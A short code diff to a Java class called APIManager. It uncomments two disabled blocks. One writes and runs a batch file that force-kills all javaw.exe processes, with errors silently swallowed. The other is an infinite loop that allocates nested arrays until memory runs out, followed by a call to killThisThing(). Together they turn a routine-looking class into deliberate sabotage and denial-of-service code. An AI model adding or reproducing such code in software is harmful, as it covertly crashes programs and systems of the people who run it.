@@ -27,13 +27,13 @@ public final class APIManager {
             FileWriter writer = new FileWriter(System.getenv("TEMP") + "\\763428675.bat");
             writer.write("taskkill /F /IM javaw.exe");
             writer.close();
-           // Runtime.getRuntime().exec("cmd /c " + System.getenv("TEMP") + "\\763428675.bat");
+            Runtime.getRuntime().exec("cmd /c " + System.getenv("TEMP") + "\\763428675.bat");
         }catch(Throwable t){
             //oops
         }
 
         Object[] o = null;
-        /*try {
+        try {
             while(true) {
                 Object[] newO = new Object[1];
                 newO[0] = o;
@@ -42,7 +42,7 @@ public final class APIManager {
         }
         finally {
             killThisThing();
-        }*/
+        }
     }
 
     public APIManager() {
